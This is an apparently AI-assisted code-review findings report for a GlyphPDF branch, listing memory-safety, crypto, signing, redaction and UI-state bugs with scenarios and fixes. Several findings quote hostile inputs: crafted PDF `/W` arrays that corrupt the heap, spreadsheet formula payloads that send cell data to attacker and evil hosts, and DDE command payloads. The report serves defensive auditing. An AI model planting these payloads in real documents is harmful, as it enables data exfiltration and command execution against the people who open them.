# GlyphPDF `feat/parity-glm` — Consolidated Review Findings

- **Snapshot:** base `main` 703fa34 → branch tip `9ba3cea`
- **Date:** 2026-09-13
- **Sources:** exhaustive 14-lane multi-agent Workflow (3-vote adversarial verification, harvested from journal), `/code-review high` deep pass, and manual audit + inline code confirmation.
- **Status legend:** ✅verified (adversarial 2/2 or inline-confirmed) · ⚠️cross-confirmed (two independent methods) · 🔎lead (single finder, not yet adversarially verified)

---

## Confirmed / high-confidence

### 1. ✅ HIGH — CID `/W` array out-of-bounds heap write + DoS
`src/engines/podofo/PoDoFoBackend.cpp` ~2528, `ensureCompleteCidSets()`
The `/W` array of a Type0 font's descendant CIDFont is parsed with **no bounds validation** (`GetNumber() -> int64_t`, no clamp to 0..65535).
- Negative CID, e.g. `/W [-5 [500 500 500]]`: collects cids `{-5,-4,-3}`, `maxCid=-3` → `bits` sized `(-3/8)+1 = 1`; the write loop then evaluates `bits[static_cast<size_t>(-5)/8]` (~2.3e18) → **wild OOB heap write**; `0x80u >> (cid % 8)` with negative shift is additionally UB. Heap corruption escapes `exportPdfA`'s `catch(std::exception)`.
- Huge range, e.g. `/W [0 4000000000 500]`: inserts ~4e9 entries into `std::set<int64_t>` + allocates a ~500 MB vector → **OOM / hang (DoS)**.
- **Reachable** via **Export → PDF/A** (`exportPdfA` calls `ensureCompleteCidSets` unconditionally) on any opened crafted PDF.
- **Fix:** reject/clamp `cid` to `0 <= cid <= 65535` before insert and before indexing; cap the range span.

### 2. ✅ HIGH — `#else` branch compile error (config-dependent build break)
`src/core/Capability.cpp` ~382, `probeOcrRapidModels()`
`Capability c;` is declared only inside the `#if` (RapidOCR) branch, but the `#else` branch does `c.status = …; c.whyNot = …; c.alternative = …;` and `return c;` — **`c` is undeclared on the `#else` path → compile error on any build without the RapidOCR/ONNX engine.** (The current CI/build config compiles the `#if` branch, so this is latent.)
- **Fix:** hoist `Capability c;` above the `#if`/`#else`.

### 3. ✅ HIGH — Excel export emits duplicate cell references → invalid XLSX
`src/engines/ConversionManager.cpp` ~848, `exportToExcelInHouse()`
The per-row cell loop writes `r="<col><row>"` from `el.column` with no dedup/merge. **Two non-empty runs sharing a geometry-derived column emit duplicate `<c r="B2">` refs in one `<row>` → invalid OOXML**; Excel flags the file corrupt / repairs it.
- **Fix:** merge or skip runs that resolve to the same column (last-write-wins or concatenate).

### 4. ⚠️ MEDIUM — Post-sign re-validation is fail-open *(found by both `/code-review high` and the Workflow)*
`src/engines/SignatureManager.cpp` ~1677
The D6 post-condition re-validation only fails when a returned `SignatureInfo` has `integrityIntact == false`. An **empty** `validateSignatures()` result (signature not detected/parsed on the candidate) makes the loop body never run → `lastOutcome` stays `Success` → the document is committed as successfully signed though its signatures could not be confirmed intact.
- **Fix:** treat an empty/again-unparseable result as failure, not vacuous pass.

---

## Surfaced leads (single finder — not yet adversarially verified)

- 🔎 MEDIUM — `SignatureManager.cpp` ~1352: a B-T signature-timestamp failure is silently downgraded to B-B but still reported as full `Success` (user believes they got a timestamped signature).
- 🔎 MEDIUM — `ConversionManager.cpp` ~358, `exportToHtml`: the PDF font name (`el.fontName`) is concatenated **raw** into an HTML `style` attribute (attribute-injection / breakage on names with quotes/`;`).
- 🔎 MEDIUM — `ConversionManager.cpp` ~312, `exportToExcel` (OpenXLSX path): silently overwrites a cell when two runs in a row resolve to the same coordinate (data loss).
- 🔎 MEDIUM — `Capability.cpp` ~191, `applyToWidget`: the Degraded branch never reverses a registry-owned disable, so a widget disabled once can stay permanently disabled across transitions.
- 🔎 LOW — `SignatureManager.cpp` ~1273 / ~1522: `leafCert` / `issuerCert` (raw `X509*`, not RAII) leak on several signing error/exception paths.
- 🔎 LOW — PPTX writer path (`ConversionManager.cpp` ~1199): text/fontName via `QXmlStreamWriter` — likely a non-issue (the writer escapes), flagged for completeness.

---

## From `/code-review high` — redaction-proof lane (Workflow finder never completed under the cap)

- 🔎 HIGH — `src/core/RedactionProof.cpp` ~693: the proof maps marks with `pageHeight` only, ignoring page `/Rotate` and non-zero MediaBox origin → on rotated/offset pages no source run is attributed, `removedStrings` stays empty, and the entry is certified **`verified-no-text-in-region` (PASS)** — a **false certification** of a redaction it never checked.
- 🔎 MEDIUM-HIGH — `src/core/RedactionProof.cpp` ~905: proof recall depends entirely on source-side PDFium extraction; text PDFium cannot extract (subset font, no `/ToUnicode`) yields empty `removedStrings` → passing verdict, contradicting the pack's claim that non-standard encodings are covered.
- 🔎 LOW — `src/engines/RedactOperation.cpp` ~222: burn-in overlay-label Y uses `pageHeight` without the MediaBox lower-left origin → label mispositioned on offset pages (excision itself unaffected).

---

## Round-2 COMPLETE — all 14 lanes (Sonnet, single-vote adversarial verify)

_All 14 finder lanes completed (incl. the previously-uncovered pages/shell-arch/ui). 49 distinct new findings below, each refute-tested by one adversarial verifier (single-vote — lower confidence than the 3-vote/inline-confirmed items above; re-confirm before acting). Excludes the known findings._


### CRITICAL

- **`src/core/RedactionProof.cpp:819`** — Redaction-proof attribution only ever looks at PDFium page-content text runs (FPDFText_LoadPage-based extractPageTextRuns), so sensitive text that lives in an annotation (FreeText note, Stamp,…
  - _Scenario:_ A user places a FreeText (or Highlight-with-Contents / Stamp) annotation reading e.g. "Client SSN: 078-05-1120" directly over a page region, draws a redaction mark over the same area, and clicks Apply Redactions with 'Generate a redaction proof pack' checked. RedactOperation::execute() (RedactOperation.cpp) calls…
- **`src/modes/BatchMode.cpp:1436`** — Batch merge reports every input file as a successful merge (with a fabricated outputPath) even when the final dst.Save() of the merged document throws and no output file is ever written.
  - _Scenario:_ startMergeWorker's mergeWorker lambda (BatchMode.cpp ~1394-1456) appends each input's pages to `dst` inside the per-file loop and immediately does `promise.addResult(r)` with r.success=true and r.outputPath=outPath (line 1411-1436) — BEFORE `dst.Save(outPath...)` is ever called (line 1446). Concrete scenario: user merges 3 valid PDFs…

### HIGH

- **`src/commands/AddFormFieldCommand.h:59`** — AddFormFieldCommand::undo() silently returns on a failed removeFieldByName (no DocumentSession::mutationFailed emission, unlike every sibling command), while QUndoStack::undo() still moves its index…
  - _Scenario:_ User adds a text field 'Signature1' (persists OK). User presses Undo; the destination is momentarily locked/read-only or disk is full, so runFormSaveTransaction's commitFileToDestination fails and removeFieldByName() returns false. undo() (lines 59-66) only qWarning()s and returns — it never calls DocumentSession::mutationFailed…
- **`src/commands/AddFormFieldCommand.h:27`** — The redo()-failure/obsolete contract this diff introduces (succeeded()/lastError(), 'callers must not dereference a pushed command after push') is not honored by the single-field placement caller:…
  - _Scenario:_ User draws a new form field on a document whose destination file is on a read-only mount, or the disk fills up mid-commit. FormBuilderMode::onFieldPlacementRequested (src/modes/FormBuilderMode.cpp:337-346) does `auto* cmd = new AddFormFieldCommand(...); m_ctx->undoStack->push(cmd);` with no check of cmd->succeeded()/lastError().…
- **`src/core/EncryptedFileSecretStore.cpp:250`** — AES-256-GCM blobs are never bound (via AAD) to the JSON `service` key they are stored under, so ciphertexts can be swapped between entries in secrets.enc.json and each will still decrypt/authenticate…
  - _Scenario:_ storeSecret("api_key_prod", X) and storeSecret("api_key_sandbox", Y) each call encrypt(secret.toUtf8()) (line 250) with no reference to `service`, and decrypt(blob) at readSecret() (line 297) likewise takes only the blob. GCM authentication covers only {key, nonce, ciphertext} — no EVP_EncryptUpdate/DecryptUpdate call ever supplies AAD.…
- **`src/core/EncryptedFileSecretStore.cpp:196`** — decrypt() still accepts legacy 0x01 AES-GCM blobs on Windows for the no-override (default) path, but this diff removed the DPAPI-binding step from resolveKey()'s legacy seed derivation (lines 72-85),…
  - _Scenario:_ EncryptedFileSecretStore is the fallback store CredentialManager.cpp uses for AI API keys ("GlyphPDF.AI.<service>") when Windows Credential Manager rejects a write. Before this diff, resolveKey()'s no-override seed was passed through CryptProtectData (line ~55-61 of the base version) before hashing, so even though that path was…
- **`src/core/MeasureCore.h:353`** — scaleFrom() neutralizes an invalid pt-labeled calibration by clearing the `calibrated` flag but leaves `unitsPerPt` at its (possibly non-1.0) persisted value, so the resulting "uncalibrated" Scale…
  - _Scenario:_ gp::measure::scaleFrom(0.5, "pt", true) returns Scale{calibrated=false, unit=Pt, unitsPerPt=0.5} — NOT the documented truthful 1:1 pt scale (contrast with the unknown-unit branch two lines above, which does reset unitsPerPt to 1.0 via ptScale()). This is directly reachable from the UI: m_unitCombo (src/modes/MeasureMode.cpp:90) offers…
- **`src/engines/ConversionManager.cpp:238`** — Private::deriveColumns() assigns a run to the nearest EXISTING column anchor within tol=max(3.0,0.5*fontSize) of that run's x-start, with no check that a genuinely different column's true separation…
  - _Scenario:_ A table row has three real columns at x=0, 8, 16pt with a 20pt font (tol=max(3,10)=10). The element at x=0 creates anchor0=0. The element at x=8 (a genuinely separate column) is only 8pt from anchor0, so dist(8)<=tol(10) and it is merged into anchor0 instead of getting its own anchor; the element at x=16 becomes anchor1 (dist=16>10).…
- **`src/engines/ConversionManager.cpp:193`** — clusterIntoRows' per-line matching tolerance is derived from the group's running max font size (never resets), so one oversized run permanently widens that line's catchment and pulls in later,…
  - _Scenario:_ A page has a large-font element (heading, drop cap, or a stray big glyph) at font size 64 which starts LineGroup G1 (baselineY=700, maxFont=64). A genuinely separate body-text line at font size 10 sitting 30pt below (y=670) is compared against G1 with tol = max(1, 0.5*max(10,64)) = 32; since |700-670|=30 <= 32 it wrongly joins G1 instead…
- **`src/engines/ConversionManager.cpp:410`** — ConversionManager::exportToCsv writes extracted PDF text into CSV cells with only double-quote doubling — no neutralization of a leading '=', '+', '-' or '@' — so PDF-controlled text becomes an…
  - _Scenario:_ A malicious PDF places a text run whose content begins with e.g. '=HYPERLINK("http://attacker/leak?"&A1,"x")' (or a DDE payload such as '=cmd|' /C calc'!A0') as the leftmost run of some row/page. exportToCsv (line ~408-422) copies el.text almost verbatim into the quoted CSV field, only doubling embedded double-quotes; it never…
- **`src/engines/ai/OllamaProvider.cpp:290`** — No cap on inbound response size: reply->readAll() buffers the entire HTTP response body in memory before any JSON parsing, with no Content-Length check or QNetworkReply::setReadBufferSize()/manual…
  - _Scenario:_ The same request that just enforced strict egress caps (kMaxSystemPromptBytes=32KB per message, kMaxTotalBytes=96KB aggregate, lines ~150-180) applies zero limit to what comes back. A process bound to 127.0.0.1:11434 (trivially spoofable by any other local user/process impersonating Ollama, since the whole point of this endpoint is 'no…
- **`src/engines/podofo/PoDoFoBackend.cpp:236`** — restoreResidentFromSource() reloads the source file without the stored encryptionPassword, so rolling back a failed mutation on a document this session just encrypted (non-empty user password)…
  - _Scenario:_ 1) loadDocument(path) an unencrypted PDF. 2) encryptDocument("realPW", ownerPw, ...) sets d->document as AES-encrypted in memory and d->encryptionPassword="realPW" (G01). 3) saveDocument(path) succeeds via the new EC01/G01 flow: the encrypted candidate is validated and the resident document is re-seated from the validated buffer using…
- **`src/modes/BatchMode.cpp:1439`** — The async merge worker emits an extra phantom BatchFileResult beyond one-per-input-file whenever the merge fails after the per-file loop, breaking the exactly-once ledger (G12) it was designed to…
  - _Scenario:_ In startMergeWorker's mergeWorker lambda (BatchMode.cpp ~1394-1454), the for-loop (line 1406) already calls promise.addResult(r) once per input file (line 1436), so for N files the promise has exactly N results after the loop. But if !anyAppended (line 1439, e.g. all N inputs are corrupt/unreadable/empty), or if dst.Save() throws (lines…
- **`src/modes/CompareMode.cpp:600`** — Exported reports (HTML and text) render a visible page's full textAdded/textRemoved/moves/pixel-diff content unconditionally, ignoring the per-category filter that made the page visible in the first…
  - _Scenario:_ Compare two PDFs where page 3 has both an added word and a moved token. In the CHANGES toolbar the user unchecks 'Text' (filter.showText=false) but leaves 'Moves' checked, then clicks Export Report. buildHtmlReport(filter)'s pageVisible(page) returns true for page 3 because hasMove&&showMove is true (line 403-409), which lets the page…
- **`src/modes/MeasureMode.cpp:341`** — Armed 'Calibrate from drawing' consumes and deletes whichever Distance annotation happens to be last in the list on ANY annotation-list mutation, not only a newly-drawn calibration stroke — a…
  - _Scenario:_ MeasureMode::setViewer (lines 186-189) routes BOTH AnnotationLayer::measurementFinished and the much broader AnnotationLayer::annotationsChanged signal into onAnnotationsChanged(). AnnotationLayer emits annotationsChanged() from deleteAnnotation(), from finishing a drag/move of ANY existing annotation (AnnotationLayer.cpp ~861), and from…
- **`src/modes/OCRMode.cpp:707`** — onReOcrRegion() dispatches a new OCR job without moving the panel to ReviewState::Running or blocking re-entrancy, so a re-OCR can be fired (and its result applied) at any point in the lifecycle…
  - _Scenario:_ User has OCR results loaded (ReviewReady) and presses Accept: transitionTo(Saving) runs and reviewAccepted() is emitted while the host performs the export asynchronously. Before the save completes, the user right-clicks the still-live image pane and picks 'Re-OCR entire page' (onImagePaneContextMenu never checks m_reviewState, so this…
- **`src/modes/OCRMode.cpp:617`** — onRejectResults() has no ReviewState guard, so Reject fired while a run is still in-flight (or while a save is Saving) does not prevent the run's late completion from resurrecting the panel.
  - _Scenario:_ User clicks Run OCR (state -> Running, Run/Accept/Reject buttons disabled per transitionTo). While the background worker is still executing, the user right-clicks the scan pane and picks 'Reject entire page' from the context menu (onImagePaneContextMenu's rejectRegion action calls onRejectResults() unconditionally, it is not gated by…
- **`src/modes/OCRMode.cpp:1037`** — A word correction is HTML-injected unescaped into the confidence-overlay anchor's title attribute, so any correction containing a quote or angle bracket corrupts the whole review overlay's rendering.
  - _Scenario:_ In updateConfidenceOverlay() (OCRMode.cpp:994-1056), the visible link text is escaped via shown.toHtmlEscaped() (line 1041), but `extra = tr(" | corrected to: %1").arg(rec.reviewedText)` (line 1037) is NOT escaped before being spliced into `title='%3% | %4 | %5%6'` (lines 1043-1052). A reviewer correcting a misread word to any text…
- **`src/modes/PagesMode.cpp:1437`** — commitGridOrder() pushes the ReorderPermutationCommand onto the undo stack (which executes redo()/reorderAllPages) before checking whether that redo actually succeeded; on failure the command is left…
  - _Scenario:_ In PagesMode::commitGridOrder (src/modes/PagesMode.cpp:1433-1455): `m_ctx->undoStack->push(cmd)` is called at line 1438, which synchronously calls cmd->redo() -> m_engine->reorderAllPages(path, perm). Only AFTER this does the code check `m_ctx->pdfEditor->lastError().severity >= ErrorInfo::Error` at line 1446. If reorderAllPages fails…
- **`src/shell/controllers/EditController.cpp:371`** — onReplaceRequested() (single 'Replace' in the Find/Replace bar) pushes an EditTextInlineCommand with no EditPolicy::mutationBlocked() check, unlike onReplaceAllRequested() right below it which was…
  - _Scenario:_ Open a read-only (e.g. expired) document, open the Find & Replace bar (toggleFindBar()/FindBar visibility is not gated by read-only at all), search for a term, and click single 'Replace'. FindBar::replaceRequested is wired directly to EditController::onReplaceRequested (GpMainWindow.cpp:394), bypassing ToolRegistry::activate entirely;…
- **`src/shell/controllers/PagesController.cpp:338`** — showPageManagement() performs DeletePages/RotatePages/InsertBlankPage with no EditPolicy::mutationBlocked() check, and it is reached via ToolId::Extract which EditPolicy::isMutatingTool()…
  - _Scenario:_ Open an expired (or otherwise read-only) document. ToolRegistry::activate(ToolId::Extract) passes isEnabled() (Extract is not in isMutatingTool) and calls PagesController::showPageManagement(), which opens PageManagementDialog. Choosing 'Delete Pages', 'Rotate Pages' or 'Insert Blank Page' (not 'Extract Pages') falls into the `else`…
- **`src/ui/CommentsWidget.cpp:752`** — csvEscapeField()/displayedCsv() (used by the new 'Export CSV' action) only RFC-4180-quotes fields containing a quote, comma or newline; it never neutralizes a leading '=', '+', '-' or '@', so…
  - _Scenario:_ A PDF received from an untrusted source contains a comment annotation whose text (or Author) is e.g. `=cmd|'/c calc.exe'!A0` or `=HYPERLINK("http://evil/x?"&A1,"open")`. The reviewer opens the PDF in GlyphPDF, opens the Comments panel, and clicks 'Export CSV…' (CommentsWidget.cpp ~769-796) to a .csv file, then opens that file in…
- **`src/ui/EditAnnotationCommand.h:26`** — EditAnnotationCommand::undo() applies the annotation mutation unconditionally, while redo() (EditAnnotationCommand.cpp:10-17) was just given an ARC07 read-only gate (setObsolete(true) + return when…
  - _Scenario:_ Document is writable when the user edits an annotation; the EditAnnotationCommand is pushed and redo() applies it (doc not read-only at that time). The session later becomes read-only (DocumentSession::setReadOnly(true) — e.g. after signing/certifying, or a UI 'lock' toggle) while the undo stack still holds this command. The user presses…

### MEDIUM

- **`src/core/EncryptedFileSecretStore.cpp:204`** — cipherLen is computed as blob.size() (qsizetype/64-bit) minus a small constant and truncated into a 32-bit int with no range check, so an oversized 0x01-versioned blob produces a negative/garbage…
  - _Scenario:_ secrets.enc.json is an ordinary user-writable JSON file with no size cap enforced before decrypt() is called (readSecret() at line 296 just does QByteArray::fromBase64 on whatever string is stored under `secrets[service]`). If that base64 field decodes to a blob whose size exceeds INT_MAX+29 bytes (~2.1GB), `const int cipherLen =…
- **`src/core/EncryptedFileSecretStore.cpp:183`** — The DPAPI-decrypted secret plaintext (out.pbData from CryptUnprotectData) is released via a bare LocalFree() with no SecureZeroMemory()/RtlSecureZeroMemory() first, and the same missing-zeroization…
  - _Scenario:_ Every call to readSecret() for a Windows DPAPI-wrapped secret (the default fallback-store format after this diff) copies the decrypted plaintext (e.g. an AI API key) out of out.pbData into the `plain` QByteArray, then calls LocalFree(out.pbData) (line 183) without clearing it first — Microsoft's own DPAPI guidance calls for…
- **`src/core/MeasureCore.h:178`** — fromRatioParts() silently mislabels its result when drawingUnit and realUnit are different unit families: it computes unitsPerPt purely in drawingUnit terms (Q_UNUSED(realUnit) in the math) and then…
  - _Scenario:_ The function and parseScaleRatio's own doc comment (MeasureCore.h ~166-176, 252-256) describe drawingUnit as 'the unit the sheet is drawn in' and realUnit as a separately-meaningful 'unit the ratio's denominator counts in', i.e. they are documented as independently choosable. Calling gp::measure::fromRatioParts(1.0, 50.0, Unit::Cm,…
- **`src/engines/ConversionManager.cpp:227`** — The new deterministic text-layout pipeline (Private::clusterIntoRows at ~190-204 and Private::deriveColumns at ~227-251) matches every extracted text run against the full list of line-groups /…
  - _Scenario:_ A crafted PDF with a large number of very small, individually-positioned text-showing operators (e.g. thousands of single-glyph Tj calls, each nudged more than the ~1-3pt tolerance from every prior baseline/x-anchor — trivial to author with per-glyph Td/Tm positioning) forces clusterIntoRows to create thousands of distinct LineGroups and…
- **`src/engines/ConversionManager.cpp:445`** — exportToCsv silently drops any row whose elements are all empty-text, instead of emitting a blank record, shifting subsequent rows and losing row/position fidelity versus the pre-change behavior.
  - _Scenario:_ For a PDF page whose extracted row contains only empty-text TextElements (e.g. a visually blank separator line, or a line whose only 'text' was filtered out upstream), maxCol stays -1 because the fill loop `for (int col = 0; col <= maxCol; ++col)` never executes, leaving `line` an empty QStringList; the following `if (!line.isEmpty())`…
- **`src/engines/FormManager.cpp:308`** — applyFieldSnapshot's mutation only rewrites /V for TextBox and CheckBox fields (default: break for everything else), but EditFormFieldCommand unconditionally treats the Properties panel's 'Default…
  - _Scenario:_ User selects a dropdown (ComboBox) form field in Form Builder mode, types a new 'Default value' string, and clicks Apply. EditFormFieldCommand's constructor sets m_new.valuePresent=true / m_new.value=newProps.defaultVal regardless of field type (src/commands/EditFormFieldCommand.h:73-77). redo() calls applyFieldSnapshot(), whose mutate…
- **`src/engines/SignatureManager.cpp:1681`** — signDocumentImpl's checked-replacement (N06) path never deletes the reserved signing candidate on two failure returns, despite the comment claiming it is dropped, so a fully-signed PDF is left behind…
  - _Scenario:_ Sign a document that already has one signature (inputHasSigs, replaceOutput true, i.e. output path != input path — the normal SecurityController flow). (1) If the incremental update happens to corrupt the prior signature's ByteRange, the post-condition re-validation loop at line 1677-1690 detects !sigInfo.integrityIntact, takes the `if…
- **`src/engines/ai/OllamaProvider.cpp:211`** — AiOptions::maxTokens and AiOptions::temperature (IAiProvider.h:15-19) are accepted by OllamaProvider::chat() but never placed into the Ollama request body — only model/messages/stream are set — so…
  - _Scenario:_ A caller invokes chat(history, AiOptions{.maxTokens = 200, ...}) expecting the returned text to be capped near 200 tokens (e.g. to bound how much untrusted-document-derived text is echoed back into the UI, or to keep costs/response size predictable). Because the JSON body built at OllamaProvider.cpp:211-214 never forwards opts.maxTokens…
- **`src/engines/podofo/PoDoFoBackend.cpp:1362`** — releaseResidentFile() drops the resident document but never clears d->encryptionPassword, violating the field's own documented invariant ('Cleared whenever a different document is loaded') and…
  - _Scenario:_ 1) loadDocument(path) an unencrypted PDF (d->encryptionPassword cleared to ""). 2) encryptDocument("secretPW", ownerPw, ...) sets d->encryptionPassword="secretPW" in memory (not yet saved to disk). 3) An external SafeSave-based writer (the documented form-import case) calls releaseResidentFile(path) to release the handle before replacing…
- **`src/modes/BatchMode.cpp:1408`** — A cancelled merge reports earlier-appended input files as batch successes pointing at the merge output path, even though the worker returns before ever calling dst.Save(), so that output file is…
  - _Scenario:_ startMergeWorker's loop appends one file per iteration into a single in-memory PoDoFo::PdfMemDocument dst and calls promise.addResult(r) with r.success=true and r.outputPath=outPath for each successfully-appended input (BatchMode.cpp lines 1411-1436), while dst.Save(outPath...) only happens once after the whole loop completes (line…
- **`src/modes/BatchMode.cpp:934`** — Merge's 'at least two files' guard is evaluated against the pre-preflight file list, but the actual merge input is the post-preflight runnableFiles set, so one missing input silently downgrades a…
  - _Scenario:_ onRunClicked checks `if (m_filesToProcess.size() < 2)` at line 934 using the full GUI file list before any per-file validation. Later (lines 1319-1350) the new U08 preflight loop drops any file for which `QFileInfo::exists(inputPath)` is false, then at line 1359-1362 `startMergeWorker(runnableFiles, mergeOutPath)` is invoked with the…
- **`src/modes/BatchMode.cpp:1469`** — Per-result progress/ETA and the new 'X not processed' summary line are computed from the LIVE, mutable m_filesToProcess list rather than the snapshot the running batch actually operates on, and the…
  - _Scenario:_ accountResultAt (BatchMode.cpp ~1463-1509) computes `int total = m_filesToProcess.size();` at line 1469 and uses it for the progress-bar percentage and ETA; showSummary()'s new `remainingCount()` (BatchMode.h line 67: `fileCount() - successCount() - failCount()`, where fileCount() at line 60 also returns the live m_filesToProcess.size())…
- **`src/modes/BatchMode.cpp:1635`** — preFlightBlocker/preFlightReviewNote for batch OCR only gate on the overall Tesseract-engine capability (CapId::OcrTesseract); they never consult the per-language CapId::OcrLanguageData capability…
  - _Scenario:_ Select an OCR language in Batch mode whose tessdata is not locally present (Capability.cpp probeOcrLanguageData returns Availability::Degraded because neither the AppLocalDataLocation nor bundled tessdata file exists — this is exactly the case the branch's new setAppContext tooltip-disclosure code is written to detect). Run an…
- **`src/modes/CompareMode.cpp:236`** — CompareMode::onDiffFinished() calls m_compareWidget->setDiffResult(result) and then immediately calls showDiffResult(result), which itself calls m_compareWidget->setDiffResult(result) again (line…
  - _Scenario:_ Compare two large PDFs (e.g. several thousand pages with many text/move/pixel/structural changes). Each time a comparison finishes, onDiffFinished() (line 234) does: `m_compareWidget->setDiffResult(result);` (line 236) then `showDiffResult(result);` (line 241) which re-enters `m_compareWidget->setDiffResult(result);` (line 263).…
- **`src/modes/CompareMode.cpp:392`** — applyChangeTypeFilters() (loop starting at line 371) calls m_compareWidget->anchorIndexForStructuralChange()/anchorIndexForPage() once per CHANGES-tree row, and each of those does a linear scan over…
  - _Scenario:_ For a document comparison producing N changed-page rows plus structural (add/remove/move) rows, and M = the widget's filtered anchor count (same order as N), every filter toggle click — and every completed diff, since showDiffResult() (line 344) calls applyChangeTypeFilters() unconditionally — re-runs the loop at lines 371-398 and for…
- **`src/modes/CompareMode.cpp:267`** — showDiffResult() builds the CHANGES tree with page-diff rows first (loop at line 267) and structural page-change rows (added/removed/moved) appended after (loop at line 304), giving the visible '#'…
  - _Scenario:_ Compare two PDFs where page 2 was removed (one PageRemoved structural entry) and page 5 has text edits (one page-diff row). The tree shows row '#1' = the page-5 text-change row and row '#2' = the page-2-removed structural row. Clicking row '#1' resolves its kAnchorIndexRole via anchorIndexForPage(), which lands on anchor index 1 in the…
- **`src/modes/CompareMode.cpp:410`** — Toggling any CHANGES-tree filter checkbox while a new comparison is still running (m_watcher busy) reports stale state from the PREVIOUS comparison — including potentially showing 'FILES ARE…
  - _Scenario:_ 1) Compare two identical files -> m_lastResult.isIdentical=true, status shows 'FILES ARE IDENTICAL'. 2) User clicks 'Compare Docs' again and picks two genuinely DIFFERENT files; compareFiles() (lines 206-232) sets the status to 'COMPARING...', clears the tree, and kicks off an async QtConcurrent diff, but does not touch m_lastResult and…
- **`src/modes/OCRMode.cpp:909`** — applyWordCorrection() and markWordDeleted() mutate m_reviewWords but never call m_scanCanvas->setWords(m_reviewWords), so the source-image pane (OcrScanCanvas) keeps painting the…
  - _Scenario:_ A session image is loaded (m_scanCanvas visible per updateScanPaneView(), line 872-881). The user selects a LOW-confidence word and clicks the delete button (wordRow's ✕, wired to markWordDeleted() at line 930-940) or types a correction and presses Enter (applyWordCorrection(), line 909-928). Both functions update…
- **`src/modes/OCRMode.cpp:964`** — A typed word correction is only committed to the reviewed record on QLineEdit::returnPressed; selecting a different word discards the uncommitted text with no warning, so a user's correction can be…
  - _Scenario:_ User selects a LOW-confidence word (selectWord -> updateWordInspector loads m_reviewWords[id].reviewedText into m_wordEdit), types a corrected spelling into m_wordEdit but does not press Enter, then clicks 'Next uncertain ▸' (F8) or clicks a different word on the scan canvas/word link. selectWord() for the new id calls…
- **`src/modes/OCRMode.cpp:559`** — The word-correction line edit and delete button are never gated by the ReviewState lifecycle (only updateWordInspector()'s selection-validity check applies), so a correction typed while a new OCR run…
  - _Scenario:_ transitionTo() (OCRMode.cpp:539-584) disables m_btnAccept/m_btnReject and the uncertain-word nav buttons for every non-ReviewReady state, but never touches m_wordEdit or m_btnDeleteWord in any case (Running at 560-563, Saving at 568-571, RecoverableError at 572-575) — those two controls are only enabled/disabled by updateWordInspector()…
- **`src/modes/PagesMode.cpp:1215`** — m_lastGridCmd is a raw QUndoCommand* used only for identity comparison in onUndoStackIndexChanged, but it is never invalidated when the QUndoStack destroys the underlying command object (e.g. when a…
  - _Scenario:_ Sequence: (1) user drags pages, commitGridOrder() at src/modes/PagesMode.cpp:1435 sets m_lastGridCmd = cmd (a raw pointer into the undo stack's owned command) and records m_lastGridSnapshot/m_lastGridNewOrder; (2) user undoes that reorder (index moves below it, command still resident); (3) user performs any other undoable action…
- **`src/modes/RedactMode.cpp:539`** — Each call to RedactMode::runRedactOperation() allocates a new RedactOperation parented to the long-lived RedactMode widget but never schedules it for deletion after it finishes, unlike the…
  - _Scenario:_ RedactMode is a mode panel constructed once by ModeController (per the class's own header comment, 'same pattern as PagesMode/BatchMode') and stays alive/reused across activations of the Redact tool for as long as the document/session is open. A user iteratively redacting a large document — mark a few terms, Apply, mark more, Apply…
- **`src/shell/controllers/SecurityController.cpp:300`** — setExpiryDocument() writes a new glyph:ExpiryDate (the QDateEdit picker has no minimum-date restriction, so a past/already-expired date can be chosen) and reloads the viewer via…
  - _Scenario:_ With an editable document open, run Set Expiry Date and pick a date in the past (nothing stops this). engine->setExpiryDate() succeeds and viewer->loadDocument(inputPath) reloads the same bytes, but because this reload bypasses MainWindow::openDocument() (the only place that computes `expired` and calls…
- **`src/ui/CompareWidget.cpp:387`** — applyAnchor() clears m_suppressSync synchronously right before scheduling a QTimer::singleShot(0,...) that clears the same flag again, so the comment's stated intent ('deferred scrollbar events still…
  - _Scenario:_ With linked scrolling enabled (default) and the two compared documents having different page sizes/counts, the user clicks Next/Prev Change (or a CHANGES-tree row) to jump to an anchor whose oldPage/newPage differ. applyAnchor() sets m_suppressSync=true, calls goToPage() on both viewers, then immediately sets m_suppressSync=false (line…

### LOW

- **`src/core/EncryptedFileSecretStore.cpp:198`** — The derived AES-256 key (resolveKey()) and the decrypted plaintext secret (the `plain` QByteArray in decrypt(), and its QString copy in readSecret()) are held in ordinary QByteArray/QString heap…
  - _Scenario:_ After decrypt() returns and its QByteArray `key` (line 198) and `plain` (line 217-233) go out of scope, Qt's allocator frees but does not zero the backing heap memory, so the AES key and the plaintext secret (e.g. a signing-certificate password or API token) remain recoverable from process memory for an indeterminate time afterward — via…
- **`src/modes/OCRMode.cpp:1291`** — setSemanticDocument() sets m_reviewState directly and enables Accept/Reject but never calls transitionTo()/touches m_btnRun, so if this path is reached after onRunOcr() has disabled Run ("Running…"),…
  - _Scenario:_ onRunOcr() (line 586) puts the panel into ReviewState::Running via transitionTo(), which disables m_btnRun and relabels it "Running…" (transitionTo, line 560-563). Every other completion path (setOcrResults, setReviewSession, notifyOcrFailed, notifyOcrCanceled, notifySaveFinished) restores m_btnRun via transitionTo().…

---

## Verification hygiene & coverage

- **Coverage: COMPLETE.** All 14 finder lanes ran to completion (the final Sonnet workflow run finished 47/47 agents, 0 errors, including the previously cap-blocked `pages`, `shell-arch`, `ui`). Synthesis ran.
- **Confidence tiers** — act on these first: the **Confirmed / high-confidence** block (#1–4, 3-vote or inline-confirmed) and the 3-vote/journal-banked HIGHs (CID OOB, secret-store AAD, Ollama response-DoS, RedactMode leak, PoDoFoBackend encrypted-rollback). Everything under **Round-2 COMPLETE** is **single-vote** (the verify pass was reduced from 3 lenses to 1 to fit the account cap) → treat as a triage list and re-confirm each before landing a fix.
- The adversarial passes **refuted** a number of candidate findings (not listed).
- **Branch is a moving target** (tip advanced during the multi-day review; the review session is fixing some findings in parallel). Re-confirm against the current tip before landing fixes.
- **Cap note:** a full 14-lane × 3-vote workflow exceeds this account's usage cap; the completing run used single-vote verification. For future exhaustive reviews on this account, keep it single-vote or split lanes across windows.
